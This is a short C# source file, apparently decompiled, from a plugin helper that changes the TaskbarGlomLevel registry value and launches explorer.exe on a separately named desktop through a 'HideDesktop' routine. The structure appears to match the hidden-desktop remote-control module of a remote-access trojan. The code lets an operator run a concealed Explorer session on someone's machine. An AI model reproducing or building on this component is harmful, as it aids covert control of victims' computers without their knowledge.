using System;
using Microsoft.Win32;

namespace Plugin.Helper.OpenApp;

internal class Explorer
{
	public static void StartExplorer(string strDesktopName)
	{
		RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Explorer\\\\Advanced", writable: true);
		int num = Convert.ToInt32(registryKey.GetValue("TaskbarGlomLevel", true));
		int num2 = 2;
		if (num != num2)
		{
			registryKey.SetValue("TaskbarGlomLevel", num2);
		}
		HideDesktop.CreateProcess(Environment.GetFolderPath(Environment.SpecialFolder.Windows) + "\\explorer.exe", strDesktopName, bAppName: true);
		registryKey.SetValue("TaskbarGlomLevel", num);
		registryKey.Close();
	}
}
